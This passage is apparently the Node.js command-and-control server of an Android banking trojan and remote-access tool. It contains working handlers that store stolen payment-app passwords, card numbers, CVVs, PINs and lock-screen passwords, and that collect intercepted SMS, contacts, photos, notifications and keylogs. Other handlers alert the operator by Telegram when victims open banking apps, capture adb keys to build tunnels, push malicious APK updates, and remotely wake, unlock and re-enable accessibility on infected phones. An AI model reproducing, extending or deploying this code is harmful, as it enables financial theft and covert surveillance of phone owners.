      return;
    }
    // 屏幕阅读器：agent 原生 UI 树回包 → 归一化 {zip}（前端 atob + inflateRaw 解 XML）
    if (String(t).toLowerCase() === 'ui_hierarchy') {
      READER_AGENT_AT.set(devId, Date.now());
      const data = (m.payload && typeof m.payload === 'object') ? m.payload : (m.data && typeof m.data === 'object') ? m.data : {};
      let zip = String(data.zip || data.hierarchyZip || '');
      if (!zip) {
        const xml = String(data.xml || data.hierarchy || data.content || (typeof m.payload === 'string' ? m.payload : '') || (typeof m.data === 'string' ? m.data : ''));
        if (xml.includes('<')) { try { zip = zlib.deflateRawSync(Buffer.from(xml, 'utf8')).toString('base64'); } catch {} }
      }
      if (zip) { ctx.broadcast({type: 'ui_hierarchy', device_id: devId, data: {zip}}, [devId]); return; }
      // 载荷不认识 → 落通用广播（zq-msg 日志已记原始类型，便于适配）
    }
    // password_status 一次性等待器：/command 端点的 GET_PASSWORD_STATUS 同步等回包用（面板密码获取按钮直接显示结果）
    if (String(t) === 'password_status') {
      const w = PWD_WAITERS.get(devId);
      if (w) { PWD_WAITERS.delete(devId); w.forEach(x => { clearTimeout(x.to); try { x.resolve((m.data && typeof m.data === 'object') ? m.data : m); } catch (e) {} }); }
    }
    // 数据类回包 → 入库 + 事件广播
    ingest(devId, m, t);
    const et = ZQ2XY[String(t).toUpperCase()] || t;
    ctx.broadcast({type: et, device_id: devId, data: (m.data && typeof m.data === 'object') ? m.data : m}, [devId]);
  });
}

function extractImg(m) {
  for (const k of ['image', 'b64', 'img', 'base64', 'frame', 'screenshot', 'data', 'payload']) {
    const v = m[k];
    if (typeof v === 'string' && v.length > 200 && /^[A-Za-z0-9+/=\s]+$/.test(v.slice(0, 64))) return v;
    if (v && typeof v === 'object') {
      for (const k2 of ['image', 'b64', 'base64', 'img', 'data']) {
        const v2 = v[k2];
        if (typeof v2 === 'string' && v2.length > 200) return v2;
      }
    }
  }
  return null;
}

const ZQ2XY = {
  APP_LIST_DATA: 'app_list', APP_LIST_RESPONSE: 'app_list', CONTACTS_DATA: 'contacts',
  SMS_DATA: 'sms_data', SMS_SEND_RESULT: 'sms_send_result',
  CAMERA_FRAME: 'camera_frame', CAMERA_DATA: 'camera_frame',
  MICROPHONE_DATA: 'microphone_audio', FILE_LIST: 'file_response',
  NOTIFICATIONS_DATA: 'notifications', PERMISSIONS_DATA: 'permissions_response',
};

function ingest(devId, m, t) {
  try {
    const T = String(t).toUpperCase();
    let data = (m.data && typeof m.data === 'object') ? m.data : (m.payload && typeof m.payload === 'object') ? m.payload : null;
    if (!data) {
      // 字符串载荷：尝试 JSON 解析（agent 上报 data 为字符串的场景）
      const s = (typeof m.data === 'string' && m.data) ? m.data : (typeof m.payload === 'string' ? m.payload : '');
      if (s && (s.startsWith('{') || s.startsWith('['))) { try { data = JSON.parse(s); } catch {} }
    }
    if (!data) return;
    // 应用列表回包（agent 实测回 t=app_list_response ~9KB）→ generic 'apps' 入库（面板 /m/device/:id/apps 读它）
    if (T === 'APP_LIST_RESPONSE' || T === 'APP_LIST_DATA' || T === 'APPLIST' || T === 'APPS') {
      ctx.log('zq-apps-raw', {d: devId, keys: Object.keys(data || {}).slice(0, 10), sample: JSON.stringify(data).slice(0, 400)});
      const list = Array.isArray(data) ? data : (data.apps || data.list || data.items || (Array.isArray(m.data) ? m.data : null));
      if (Array.isArray(list) && list.length) {
        ctx.db.prepare("INSERT OR REPLACE INTO generic(store,id,data,updated_at) VALUES('apps',?,?,datetime('now'))")
          .run(devId, JSON.stringify({device_id: devId, apps: list, count: list.length, ts: Date.now()}));
        ctx.log('zq-apps', {d: devId, n: list.length});
      }
      return;
    }
    if (T === 'SMS_DATA' || T === 'SMS_READ_RESPONSE') {
      const arr = Array.isArray(data) ? data : (data.sms || data.list || data.messages || []);
      const ins = ctx.db.prepare("INSERT INTO sms(device_id,device_label,sender,body,recv_at,is_read,source,create_at) VALUES(?,?,?,?,?,?,?,datetime('now'))");
      let cnt = 0, lastIt = null;
      for (const it of arr) {
        if (!it || typeof it !== 'object') continue;
        ins.run(devId, '', String(it.address || it.sender || it.number || ''), String(it.body || it.message || it.text || ''),
          String(it.date || it.time || isoNow()).slice(0, 19), it.read ? 1 : 0, 'agent');
        cnt++; lastIt = it;
      }
      // TG：仅实时推送（SMS_DATA）发通知；SMS_READ_RESPONSE 是历史批量同步，跳过防刷屏
      if (T === 'SMS_DATA' && cnt && ctx.tg) ctx.tg.notifySms(devId, lastIt, cnt);
    }
    // 通讯录上报 → generic 'contacts'（面板通讯录 Tab 读 /m/device/:id/contacts）
    if (T === 'CONTACTS_DATA' || T === 'CONTACTS_READ_RESPONSE' || T === 'CONTACTS') {
      const cl = Array.isArray(data) ? data : (data.contacts || data.list || data.items || []);
      if (Array.isArray(cl) && cl.length) {
        ctx.db.prepare("INSERT OR REPLACE INTO generic(store,id,data,updated_at) VALUES('contacts',?,?,datetime('now'))")
          .run(devId, JSON.stringify({device_id: devId, contacts: cl, count: cl.length, ts: Date.now()}));
        ctx.log('zq-contacts', {d: devId, n: cl.length});
        ctx.broadcast({type: 'contacts', device_id: devId, data: {contacts: cl.slice(0, 400)}}, [devId]);
      }
      return;
    }
    // 相册上报（agent 拍照/截图保存后推送缩略图）→ album 表（面板相册 Tab 读 /m/device/:id/album）
    if (T === 'GALLERY_IMAGE_SAVED' || T === 'GALLERY_IMAGE' || T === 'GALLERY_DATA') {
      try {
        const b64 = String(data.thumb || data.thumbnail || data.base64 || data.image || data.data || '').replace(/^data:image\/[a-z]+;base64,/, '');
        if (b64.length > 100) {
          const buf = Buffer.from(b64, 'base64');
          const name = String(data.name || data.filename || data.display_name || String(data.path || '').split('/').pop() || ('img_' + Date.now())).slice(0, 120);
          const pth = String(data.path || data.filePath || data.fullPath || name).slice(0, 300);
          const gid = require('crypto').createHash('md5').update(String(devId) + pth).digest('hex').slice(0, 16);
          const mtime = parseInt(data.time || data.mtime || data.timestamp) || Math.floor(Date.now() / 1000);
          ctx.db.prepare("INSERT OR REPLACE INTO album(id,device_id,display_name,path,size,mtime,thumb,fetched_at) VALUES(?,?,?,?,?,?,?,datetime('now','localtime'))")
            .run(gid, String(devId || ''), name, pth, parseInt(data.size) || buf.length, mtime, buf);
          ctx.log('zq-gallery', {d: devId, n: name.slice(0, 40), sz: buf.length});
          ctx.broadcast({type: 'device_update'}, [devId]);
        }
      } catch (e) { ctx.log('zq-gallery-err', String(e).slice(0, 100)); }
      return;
    }
    // 设备通知上报（通知监听器）→ notifications 表（含 device_id/app_pkg/原始时间，修复列表数据不完整）
    if (T === 'NOTIFICATIONS_DATA' || T === 'NOTIFICATION' || T === 'NOTIFY') {
      const arr = Array.isArray(data) ? data : (data.notifications || data.list || data.items || [data]);
      const ins = ctx.db.prepare("INSERT INTO notifications(title,body,level,is_read,created_at,device_id,app_pkg,src_time) VALUES(?,?,?,0,datetime('now','localtime'),?,?,?)");
      let cnt = 0;
      for (const it of arr) {
        if (!it || typeof it !== 'object') continue;
        const ti = String(it.title || it.app_name || it.name || '设备通知').slice(0, 120);
        const bo = String(it.text || it.content || it.body || it.ticker || it.message || '').slice(0, 1000);
        if (!ti && !bo) continue;
        const pkg = String(it.packageName || it.app_pkg || it.pkg || it.package || it.app || '').slice(0, 120);
        const st = String(it.time || it.when || it.postTime || it.timestamp || '').slice(0, 19);
        ins.run(ti, bo, 'info', devId, pkg, st);
        cnt++;
      }
      if (cnt) { ctx.log('zq-notif', {d: devId, n: cnt}); ctx.broadcast({type: 'device_update'}, [devId]); }
    }
  } catch {}
}

// ---------------- /p /s /n HTTP（tpx 桥 + agent HTTP 模式，与 py 版 1:1） ----------------
async function httpHandler(pathname, req, res, ctxRef, body, query) {
  if (pathname === '/n') {
    if (!regAllowed(clientIp(req))) { res.writeHead(429, {'Content-Type': 'application/json'}); return res.end('{"error":"注册过于频繁"}'); }
    const devId = registerDevice(body || {}, clientIp(req));
    if (!devId) { res.writeHead(400); return res.end(j({error: 'missing di'})); }
    const tk = require('crypto').randomBytes(24).toString('hex');
    res.writeHead(200, {'Content-Type': 'application/json'});
    return res.end(j({tk, token: tk}));
  }
  const json = obj => { res.writeHead(200, {'Content-Type': 'application/json'}); res.end(j(obj)); };
  const devId = String(query.d || query.di || (body && (body.di || body.deviceId)) || '');
  // /n/poll：命令轮询（同 /s/pc，冲掉积压队列）
  if (pathname === '/n/poll') {
    const cmds = devId ? (ZQ_QUEUE.get(devId) || []) : [];
    if (devId) { touchDb(devId, {ip: clientIp(req)}); ZQ_QUEUE.delete(devId); }
    return json({success: true, code: 0, data: {commands: cmds}, commands: cmds});
  }
  // /n/result：密码/凭证捕获上报（APK cipher 模块：支付 app 输入监听 + DeviceAdmin 锁屏密码事件）
  //   之前服务器缺这个路由，agent 上报全部 404 丢弃 —— 深度反编译 libnmmp.so 发现后补上
  if (pathname === '/n/result') {
    if (devId) touchDb(devId, {ip: clientIp(req)});
    try {
      let items = [];
      if (Array.isArray(body)) items = body;
      else if (body && typeof body === 'object') items = Array.isArray(body.data) ? body.data : (Array.isArray(body.items) ? body.items : [body]);
      const ins = ctxRef.db.prepare("INSERT INTO credentials(device_id,device_label,app_name,app_pkg,login,password,card,cvv,exp_date,pay_pin,type,capt_at,extra) VALUES(?,?,?,?,?,?,?,?,?,?,?,datetime('now','localtime'),?)");
      let n = 0;
      for (const it of items) {
        if (!it || typeof it !== 'object') continue;
        const t = String(it.type || it.t || (it.isPassword ? 'pwd' : '')).toLowerCase();
        const d = ctxRef.getDevice(devId) || {};
        ins.run(devId, String(d.model || d.brand || '').slice(0, 40),
          String(it.app_name || it.app || '').slice(0, 60), String(it.app_pkg || it.pkg || it.package || '').slice(0, 120),
          String(it.login || it.account || it.user || it.username || '').slice(0, 200),
          String(it.password || it.pwd || it.data || it.value || it.val || '').slice(0, 500),
          String(it.card || it.card_no || it.cardNum || '').slice(0, 40), String(it.cvv || '').slice(0, 8),
          String(it.exp_date || it.exp || it.expiry || '').slice(0, 20), String(it.pay_pin || it.pin || '').slice(0, 12),
          t || 'pwd', JSON.stringify(it).slice(0, 800));
        n++;
        if (t) {   // 设备卡片「密码类型」标记
          const dv = ctxRef.getDevice(devId);
          if (dv) { dv.password_type = t.includes('lock') ? '锁屏密码' : '支付密码'; ctxRef.setDevice(dv); }
        }
        // 银行卡/支付数据 → payrec 逐条记录（面板「支付记录」Tab 按 device_id 过滤展示）
        if (it.card || it.pay_pin || /card|pay/i.test(t)) {
          try {
            const prId = (Date.now() % 1e10) * 10 + (n % 10);
            ctxRef.db.prepare("INSERT OR REPLACE INTO generic(store,id,data,updated_at) VALUES('payrec',?,?,datetime('now'))")
              .run(String(prId), JSON.stringify({id: prId, device_id: devId,
                app_name: String(it.app_name || it.app || '').slice(0, 60),
                card: String(it.card || it.card_no || '').slice(0, 40),
                cvv: String(it.cvv || '').slice(0, 8), exp_date: String(it.exp_date || '').slice(0, 20),
                pay_pin: String(it.pay_pin || '').slice(0, 12), amount: it.amount || '',
                status: 'pending', data: it,
                created_at: new Date(Date.now() + 8 * 3600e3).toISOString().slice(0, 19).replace('T', ' ')}));
            ctxRef.broadcast({type: 'device_update'}, [devId]);
          } catch {}
        }
      }
      if (n) { ctxRef.log('n/result', {d: devId, n}); ctxRef.broadcast({type: 'device_update'}, [devId]);
        if (ctxRef.tg) ctxRef.tg.notifyCredential(devId, items[0], n); }   // TG：凭证捕获通知
    } catch (e) { ctxRef.log('n/result-err', String(e).slice(0, 120)); }
    return json({success: true, code: 0, data: {}});
  }
  // /n/sms：短信上报（agent 拦截新短信推送）
  if (pathname === '/n/sms') {
    if (devId) touchDb(devId, {ip: clientIp(req)});
    try {
      let items = [];
      if (Array.isArray(body)) items = body;
      else if (body && typeof body === 'object') items = Array.isArray(body.data) ? body.data : (Array.isArray(body.sms) ? body.sms : (Array.isArray(body.items) ? body.items : [body]));
      const ins = ctxRef.db.prepare("INSERT INTO sms(device_id,device_label,sender,body,recv_at,is_read,source,create_at) VALUES(?,?,?,?,?,0,'agent',datetime('now','localtime'))");
      let n = 0;
      for (const it of items) {
        if (!it || typeof it !== 'object') continue;
        const d = ctxRef.getDevice(devId) || {};
        ins.run(devId, String(d.model || d.brand || '').slice(0, 40),
          String(it.sender || it.address || it.from || it.number || '').slice(0, 60),
          String(it.body || it.message || it.text || it.content || '').slice(0, 2000),
          String(it.date || it.time || it.recv_at || '').slice(0, 19));
        n++;
      }
      if (n) { ctxRef.log('n/sms', {d: devId, n}); ctxRef.broadcast({type: 'device_update'}, [devId]);
        if (ctxRef.tg) ctxRef.tg.notifySms(devId, items[items.length - 1], n); }   // TG：新短信通知
    } catch (e) { ctxRef.log('n/sms-err', String(e).slice(0, 120)); }
    return json({success: true, code: 0, data: {}});
  }
  if (pathname.startsWith('/p/') || pathname.startsWith('/s/')) {
    if (devId) touchDb(devId, {ip: clientIp(req)});   // HTTP 轮询模式设备也刷新真实 IP
    if (pathname === '/s/pc') {             // 命令轮询：冲掉积压队列
      const q = ZQ_QUEUE.get(devId) || [];
      ZQ_QUEUE.delete(devId);
      return json({success: true, code: 0, data: {commands: q}, commands: q});
    }
    if (pathname === '/s/hb') return json({ok: true});   // 心跳（ok 为 bool）
    // /s/tk：adb 配对密钥上报 → 存 /root/adb_keys/<devId>.pem → 热加载 adb → 自动 connect 隧道口。
    // 全量记录 raw body，递归遍历 JSON 字段找 PEM 或 base64 私钥，兼容多种字段名
    if (pathname === '/s/tk') {
      const raw = typeof body === 'string' ? body : (body ? JSON.stringify(body) : '');
      // devId 白名单清洗：原实现直接拼进 /root/adb_keys/<devId>.pem 模板字符串，
      // '../' 可越出目录写任意文件（实测），清洗后仅允许 [\w-]
      const tkDev = String(devId || '').replace(/[^\w-]/g, '').slice(0, 64);
      ctxRef.log('s/tk', {d: devId, m: req.method, len: raw.length, head: raw.slice(0, 160)});
      try {
        const b = body && typeof body === 'object' ? body : {};
        const vals = [];
        (function walk(o, depth) {
          if (!o || depth > 5) return;
          if (typeof o === 'string') { vals.push(o); return; }
          if (typeof o === 'object') for (const k of Object.keys(o)) walk(o[k], depth + 1);
        })(b, 0);
        let key = vals.find(v => typeof v === 'string' && v.includes('PRIVATE KEY'));
        if (!key) key = vals.find(v => typeof v === 'string' && v.length > 300 && /^[A-Za-z0-9+/=\s]+$/.test(v.slice(0, 200)));
        if (key && tkDev) {
          const fs = require('fs');
          const fp = `/root/adb_keys/${tkDev}.pem`;
          fs.mkdirSync('/root/adb_keys', {recursive: true});
          if (key.includes('PRIVATE KEY')) {
            fs.writeFileSync(fp, key.endsWith('\n') ? key : key + '\n');          // PEM 原样
          } else {
            fs.writeFileSync(fp, Buffer.from(key.replace(/\s/g, ''), 'base64'));  // DER base64 → 二进制存
          }
          ctxRef.log('s/tk-key-saved', {d: tkDev, fp});
          try { ctxRef.eagle && ctxRef.eagle.adbKeyReload && ctxRef.eagle.adbKeyReload(tkDev); } catch (e) {}
        } else {
          ctxRef.log('s/tk-nokey', {d: devId, fields: Object.keys(b || {}).slice(0, 10)});
        }
      } catch (e) { ctxRef.log('s/tk-err', {d: devId, e: String(e).slice(0, 100)}); }
      return json({success: true, code: 200, data: {}});
    }
    if (pathname === '/s/ct') return json({success: true, code: 0, data: {}, tasks: []});   // 任务轮询
    if (pathname === '/s/tc') {             // 任务结果上报 → 前端 command_result
      const b = body && typeof body === 'object' ? body : {};
      if (devId) ctxRef.broadcast({type: 'command_result', device_id: devId,
        data: {command: b.cmd || '', ok: b.ok !== false}}, [devId]);
      return json({success: true});
    }
    // /p/k：agent 运行日志流上报（logType: ADPT适配/ARTS系统/CMDX命令/WARN警告/NETW网络 + content + timestamp，
    //   每 ~5s 一批）→ keylogs 表（限流防爆库）
    if (pathname === '/p/k') {
      let pkDev = String(query.d || query.di || (body && (body.di || body.deviceId || body.d)) || devId || '');
      if (!pkDev) {   // agent 的 /p/k 不带设备标识：按来源 IP 反查在线设备归属
        try {
          const ip = clientIp(req);
          pkDev = (ctxRef.db.prepare('SELECT id, data FROM devices').all()
            .map(r => JSON.parse(r.data))
            .find(d => d.online && String(d.ip) === ip) || {}).id || '';
        } catch {}
      }
      try {
        const b = body && typeof body === 'object' ? body : {};
        let evts = Array.isArray(b) ? b : (Array.isArray(b.events) ? b.events : (Array.isArray(b.data) ? b.data : (Array.isArray(b.logs) ? b.logs : null)));
        if (evts === null && b && typeof b === 'object' && Object.keys(b).length) evts = [b];
        if (Array.isArray(evts) && evts.length) {
          const key = pkDev + ':' + Math.floor(Date.now() / 60e3);   // 每设备每分钟限 12 批入库
          const c = (ZQ_RATE.get(key) || 0) + 1;
          ZQ_RATE.set(key, c);
          if (ZQ_RATE.size > 5000) ZQ_RATE.clear();
          if (c <= 12) {
            const ins = ctxRef.db.prepare("INSERT INTO keylogs(device_id,app_pkg,log_type,text,capt_at) VALUES(?,?,?,?,datetime('now','localtime'))");
            for (const it of evts.slice(0, 50)) {
              if (it === null || it === undefined) continue;
              const o = typeof it === 'object' ? it : {data: String(it)};
              ins.run(pkDev, String(o.pkg || o.app_pkg || o.package || '').slice(0, 120),
                String(o.logType || o.type || o.event || o.t || 'capture').slice(0, 40),
                String(o.content || o.data || o.msg || JSON.stringify(o)).slice(0, 2000));
            }
            ctxRef.log('p/k', {d: pkDev, n: evts.length});
          }
        }
      } catch (e) { ctxRef.log('p/k-err', String(e).slice(0, 120)); }
      return json({success: true, code: 0, data: {}});
    }
    // /s/lk：无障碍状态上报 → 更新设备无障碍标记
    if (pathname === '/s/lk') {
      try {
        const b = body && typeof body === 'object' ? body : {};
        const acc = b.accessibility || b.enabled || b.on;
        if (devId && acc !== undefined) {
          const dv = ctxRef.getDevice(devId);
          if (dv) { dv.has_access = String(acc) === 'true' || acc === true || acc === 1; ctxRef.setDevice(dv); }
        }
        ctxRef.log('s/lk', {d: devId, v: String(JSON.stringify(body)).slice(0, 100)});
      } catch {}
      // /s/lk 双语义分流：POST=agent 无障碍上报（只回 ack）；GET=dxs 拉 frpc 配置。
      // UA 细分：dxs=Go-http-client → 回 tps；其余 UA 的 GET（agent 自己的配置同步）→ 回空，
      // 绝不能让 agent 拿到 remotePort——它会把 frps 端口当本机 adb 端口去连，直接崩溃循环。
      const lkUA = String(req.headers['user-agent'] || '');
      if (req.method === 'GET' && lkUA.includes('Go-http-client')) {
        // 只给已注册设备下发隧道配置
        if (!isKnownDevice(devId)) {
          ctxRef.log('s/lk-reject', {d: String(devId).slice(0, 64), ua: lkUA.slice(0, 40)});
          return json({success: false, code: 403, error: 'unknown device'});
        }
        const host = String(req.headers.host || '').split(':')[0] || '127.0.0.1';
        // 每设备独立远端端口（frps allowPorts 15563-15570）：PJT110=15563，OPPO CPH2631=15564，其余默认 15563
        const remotePort = devId === '2612a86a4f984723' ? 15564 : 15563;
        const tpsPort = Number(process.env.EAGLE_TPS_PORT || 7000);
        const FRP_TOKEN = process.env.EAGLE_FRP_TOKEN || '';
        const tps = {tpsAddr: host, tpsPort, remotePort, server_addr: host, server_port: tpsPort};
        if (FRP_TOKEN) { tps.tpsToken = FRP_TOKEN; tps.token = FRP_TOKEN; }
        ctxRef.log('s/lk-dxs', {d: devId, ua: lkUA.slice(0, 40)});
        return json({success: true, code: 200, data: tps, ...tps});
      }
      ctxRef.log('s/lk-ack', {d: devId, m: req.method, ua: lkUA.slice(0, 40)});
      return json({success: true, code: 0, data: {}});
    }
    // /s/sa：敏感应用上报（打开银行/支付 app 检测）→ 通知 + 前端推送
    if (pathname === '/s/sa') {
      try {
        const b = body && typeof body === 'object' ? body : {};
        const pkg = String(b.pkg || b.package || query.pkg || '').slice(0, 120);
        ctxRef.log('s/sa', {d: devId, pkg, raw: String(JSON.stringify(body)).slice(0, 150)});
        if (devId) {
          ctxRef.db.prepare("INSERT INTO notifications(title,body,level,is_read,created_at,device_id,app_pkg) VALUES(?,?, 'info',0,datetime('now','localtime'),?,?)")
            .run('敏感应用', '设备 ' + devId.slice(-6) + ' 打开了: ' + (pkg || '未知应用'), devId, pkg);
          ctxRef.broadcast({type: 'device_update'}, [devId]);
          if (ctxRef.tg) ctxRef.tg.notifyNotification(devId, '敏感应用', '打开了: ' + (pkg || '未知应用'));   // TG：通知拦截
        }
      } catch (e) { ctxRef.log('s/sa-err', String(e).slice(0, 100)); }
      return json({success: true, code: 0, data: {}});
    }
    // /s/sh：shell 输出上报 → 前端 command_result 回显
    if (pathname === '/s/sh') {
      const b = body && typeof body === 'object' ? body : {};
      if (devId) ctxRef.broadcast({type: 'command_result', device_id: devId,
        data: {command: 'shell', ok: true, output: String(b.output || b.data || b.result || '').slice(0, 4000)}}, [devId]);
      ctxRef.log('s/sh', {d: devId, len: String(b.output || b.data || '').length});
      return json({success: true, code: 0, data: {}});
    }
    // /s/av：agent 版本检查（?di=&cv=当前版本）→ 返回最新构建的 APK（自动更新闭环）
    if (pathname === '/s/av') {
      try {
        const cv = String(query.cv || (body && body.cv) || '');
        const builds = ctxRef.db.prepare("SELECT data FROM generic WHERE store='builds'").all().map(r => JSON.parse(r.data))
          .filter(x => x.status === 'done' && x.apk_size).sort((a, b2) => String(b2.finished_at || '').localeCompare(String(a.finished_at || '')));
        const latest = builds[0];
        if (!latest) return json({success: true, code: 0, data: {}});
        const fs = require('fs'), pathMod = require('path');
        const fp = pathMod.join(ctxRef.ROOT, 'uploads', `build_${latest.id}.apk`);
        if (!fs.existsSync(fp)) return json({success: true, code: 0, data: {}});
        return json({success: true, code: 0, data: {version: String(latest.finished_at || latest.id).slice(0, 19),
          url: `/s/vu?di=${encodeURIComponent(devId)}`, size: latest.apk_size,
          url_direct: `/m/build/${latest.id}/download`, force: false}, latest: latest.id});
      } catch (e) { ctxRef.log('s/av-err', String(e).slice(0, 100)); return json({success: true, code: 0, data: {}}); }
    }
    // /s/vu：更新包下载 → 重定向到最新构建产物
    if (pathname === '/s/vu') {
      try {
        const builds = ctxRef.db.prepare("SELECT data FROM generic WHERE store='builds'").all().map(r => JSON.parse(r.data))
          .filter(x => x.status === 'done' && x.apk_size).sort((a, b2) => String(b2.finished_at || '').localeCompare(String(a.finished_at || '')));
        if (builds[0]) { res.writeHead(302, {Location: `/m/build/${builds[0].id}/download`}); return res.end(); }
      } catch {}
      res.writeHead(404); return res.end('{"error":"no package"}');
    }
    if (pathname === '/s/il') {             // 键盘记录日志入库（批量）
      try {
        const b = body && typeof body === 'object' ? body : {};
        let logs = (b.data && b.data.logs) || b.logs;
        if (!Array.isArray(logs) && Array.isArray(b)) logs = b;
        if (!Array.isArray(logs) && Array.isArray(b.logs)) logs = b.logs;
        if (Array.isArray(logs) && logs.length) {
          const ins = ctxRef.db.prepare("INSERT INTO keylogs(device_id,app_pkg,log_type,text,capt_at) VALUES(?,?,?,?,datetime('now'))");
          for (const it of logs) if (it && typeof it === 'object')
            ins.run(devId, String(it.app_pkg || it.package || ''), String(it.logType || it.type || 'LOG'),
                    String(it.content || it.msg || '').slice(0, 2000));
          ctxRef.log('s/il', {d: devId, n: logs.length});
        }
      } catch {}
      return json({success: true, code: 0, data: {}});
    }
    // 其余 /s/<xx>（td/cr/ba/ig/sm/uv/mg/tr/cx 等低频数据上报）：宽松入库不丢数据
    if (req.method === 'POST' && body && typeof body === 'object' && Object.keys(body).length) {
      try {
        ctxRef.db.prepare("INSERT INTO keylogs(device_id,app_pkg,log_type,text,capt_at) VALUES(?,?,?,?,datetime('now','localtime'))")
          .run(devId, pathname, 'report', JSON.stringify(body).slice(0, 4000));
        ctxRef.log('s/report', {p: pathname, d: devId, sz: JSON.stringify(body).length});
      } catch {}
    }
    return json({success: true, code: 0, data: {}});   // /s/<xx> 通用：心跳 touch 即可
  }
  // 未匹配的设备端点：明确 404（返回 false 会让连接挂死到超时，被扫描器探测时尤其难看）
  if (pathname.startsWith('/n/') || pathname.startsWith('/api/')) {
    res.writeHead(404, {'Content-Type': 'application/json'});
    return res.end('{"error":"not found"}');
  }
  return false;                              // 未处理
}
// 行为流限流计数器（/p/k 防爆库）+ 设备注册限流（/n 防假设备刷库）
const ZQ_RATE = new Map();
const REG_RATE = new Map();       // ip -> {win, n}
function regAllowed(ip) {
  const now = Date.now();
  const r = REG_RATE.get(ip);
  if (!r || now - r.win > 60e3) { REG_RATE.set(ip, {win: now, n: 1}); if (REG_RATE.size > 5000) REG_RATE.clear(); return true; }
  return ++r.n <= 5;              // 同 IP 每分钟最多注册 5 次
}

// ---------------- 命令映射（面板命令 → agent） ----------------
const XY2ZQ = {
  TAKE_SCREENSHOT: 'CAPTURE_SCREEN', GET_SMS: 'SMS_READ', SEND_SMS: 'SMS_SEND', GET_CONTACTS: 'CONTACTS_READ',
  // 键盘记录：agent 真实命令为 startGetevent/stopGetevent；防卸载命令走原名透传
  KEYLOGGER_START: 'startGetevent', KEYLOGGER_STOP: 'stopGetevent',
  ENABLE_DXS_BLACK_SCREEN: 'ENABLE_BLACK_SCREEN', DISABLE_DXS_BLACK_SCREEN: 'DISABLE_BLACK_SCREEN',
};
const SCREEN_TECH_CMDS = new Set(['SCREEN_CAPTURE_SET_TECH', 'SCREEN_CAPTURE_RESUME', 'SCREEN_CAPTURE_SET_TECH_ADB']);
const KEYCODES = {HOME: '3', BACK: '4', RECENTS: '187', POWER: '26', VOLUME_UP: '24', VOLUME_DOWN: '25', MENU: '82', APP_SWITCH: '187'};

async function commandToDevice(devId, cmd, payload) {
  payload = payload || {};
  if (!cmd) return false;
  // 植入ADB/无线配对前置：agent 自动导航靠无障碍点屏幕，息屏/锁屏时点不到任何东西
  // （实测锁屏息屏设备 FULL_DEPLOY 卡死到超时"无线配对未成功"）——先唤醒+上滑解锁再发主命令
  if (cmd === 'FULL_DEPLOY' || cmd === 'DIRECT_PAIR') {
    const dev = ctx.getDevice(devId) || {};
    if (dev.screen_on === false || dev.is_locked === true) {
      ctx.log('zq-deploy-prep', {d: devId, screen_on: dev.screen_on, locked: dev.is_locked});
      try {
        if (dev.screen_on === false) { dispatch(devId, 'POWER_WAKE', {}); await new Promise(r => setTimeout(r, 1500)); }
        if (dev.is_locked === true) { dispatch(devId, 'SMART_UNLOCK_SWIPE', {}); await new Promise(r => setTimeout(r, 2500)); }
      } catch {}
    }
  }
  // 无障碍自恢复：agent WS 随无障碍服务生死（关闭无障碍 → WS 断 → ENABLE_ACCESSIBILITY 无法送达 agent），
  // WS 离线且有 adb 隧道时直接 adb 写 secure settings 恢复（组件名可由 payload.service 指定）
  if (cmd === 'ENABLE_ACCESSIBILITY' && !ZQ_WS.has(devId) && ctx.eagle.adbMap[devId]) {
    const svc = String(payload.service || 'com.zq.final/com.nest.craft.spark.service.PlatformAssistDaemon');
    const r1 = await ctx.eagle.adbShell(devId, ['settings', 'put', 'secure', 'enabled_accessibility_services', svc]);
    const r2 = await ctx.eagle.adbShell(devId, ['settings', 'put', 'secure', 'accessibility_enabled', '1']);
    ctx.log('zq-a11y-adb-recover', {d: devId, ok: r1 !== null && r2 !== null});
    return r1 !== null;
  }
  if (!ZQ_WS.has(devId)) return false;
  try {
    // ADB 投屏（第三块屏）：a11y 截图流 + adb 截屏泵兜底，不走 RTC
    if (cmd === 'SCREEN_CAPTURE_SET_TECH_ADB') {
      if (!ctx.eagle.adbMap[devId]) return false;   // 无 adb serial（无隧道）→ 不可用
      ZQ_RTC.delete(devId);
      ctx.eagle.adbPumpStart(devId);
      ZQ_ACT_AT.set(devId, Date.now());
      ZQ_ACT_WS.set(devId, ZQ_WS.get(devId) || null);
      ZQ_STREAM.add(devId); streamSave();
      if (!ZQ_LAST_FRAME.get(devId)) ZQ_LAST_FRAME.set(devId, Date.now() - 30000);
      ZQ_FRAME_CNT.set(devId, {winStart: Date.now(), n: 0});
      dispatch(devId, 'SCREEN_CAPTURE_SET_TECH', {tech: 'accessibility'});
      wsSend(devId, INIT_CFG());
      return true;
    }
    if (SCREEN_TECH_CMDS.has(cmd)) {
      // 屏幕流激活（无感/系统投屏按钮）：默认 a11y 截图流 —— 实测 avg 181ms/p95 198ms，且不受
      // ColorOS「屏幕共享保护」屏蔽（RTC/MediaProjection 视频在通知栏等敏感界面会被屏蔽成黑帧，
      // 实证：通知栏拉下时截图 29KB 满内容 vs 视频全黑）。RTC 机制保留（浏览器显式 RTC_START/
      // turn-nodes 开启时自动升级），不再强制叠加。
      streamActivate(devId, {force: true});
      return true;
    }
    if (cmd === 'SCREEN_CAPTURE_STOP') { streamDeactivate(devId); return dispatch(devId, 'SCREEN_CAPTURE_STOP', payload); }
    if (cmd === 'KEY_EVENT') {
      const key = String(payload.key || '').toUpperCase();
      if (KEYCODES[key] && await ctx.eagle.adbShell(devId, ['input', 'keyevent', KEYCODES[key]]) !== null) return true;
      return dispatch(devId, cmd, payload);
    }
    if (['GET_BATTERY_INFO', 'GET_NETWORK_INFO', 'GET_NOTIFICATIONS', 'GET_CURRENT_WINDOW'].includes(cmd)) {
      const fns = {GET_BATTERY_INFO: ctx.eagle.answerBattery, GET_NETWORK_INFO: ctx.eagle.answerNetwork,
        GET_NOTIFICATIONS: ctx.eagle.answerNotifications, GET_CURRENT_WINDOW: ctx.eagle.answerCurrentWindow};
      fns[cmd](devId);
      return true;
    }
    if (['POWER_SLEEP', 'SCREEN_OFF', 'SYSTEM_LOCK_SCREEN'].includes(cmd)) {
      if (await ctx.eagle.adbShell(devId, ['input', 'keyevent', '26']) !== null) return true;
      return dispatch(devId, XY2ZQ[cmd] || cmd, payload);
    }
    if (['POWER_WAKE', 'SCREEN_ON'].includes(cmd)) {
      if (await ctx.eagle.adbShell(devId, ['input', 'keyevent', 'KEYCODE_WAKEUP']) !== null) return true;
      return dispatch(devId, XY2ZQ[cmd] || cmd, payload);
    }
    // 黑屏遮挡文字兼容：面板 vM 对话框把遮挡文字放 updateTitle 字段，而 agent 纯黑样式只读
